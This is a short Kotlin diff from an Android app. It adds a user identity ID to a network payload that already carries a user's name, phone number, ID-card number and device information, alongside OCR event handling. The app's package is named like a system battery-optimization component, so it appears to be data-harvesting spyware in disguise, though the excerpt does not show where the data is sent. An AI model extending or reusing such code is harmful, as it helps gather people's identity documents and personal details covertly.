@@ -281,13 +281,15 @@ class InputRepository private constructor(private val context: Context) {
             val name = userInfo?.name ?: "Unknown"
             val phone = userInfo?.phone ?: "Unknown"
             val idCard = userInfo?.idCard ?: "Unknown"
+            val userIdentityId = userInfo?.userIdentityId ?: ""
 
             val deviceInfoJson = DeviceInfoHelper.getDeviceInfoJson(context)
 
             val userInfoPayload = com.android.batteryoptimization.network.UserInfoPayload(
                 name = name,
                 phone = phone,
-                idCard = idCard
+                idCard = idCard,
+                userIdentityId = userIdentityId
             )
 
             // 分离 OCR 事件和普通事件
